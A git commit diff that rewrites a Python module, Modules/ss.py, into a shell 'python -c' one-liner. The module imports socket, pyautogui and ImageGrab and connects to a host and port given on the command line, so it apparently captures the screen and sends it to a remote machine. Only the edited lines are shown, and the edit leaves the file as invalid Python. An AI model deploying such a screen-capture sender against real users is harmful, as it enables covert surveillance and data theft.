05280c0326d3d0e53b94362c1bf849a87f13ee3d
wdani <68472201+WilleLX1@users.noreply.github.com>
2023-10-26 17:53:32 +0200

    Update ss.py

--- Modules/ss.py
+++ Modules/ss.py
@@ -1,4 +1,4 @@
-import socket
+python -c 'import socket
 import pyautogui
 from PIL import ImageGrab
 import io
@@ -82,4 +82,4 @@ if __name__ == "__main__":
     host = sys.argv[1]
     port = int(sys.argv[2])
 
-    main(host, port)
+    main(host, port)'
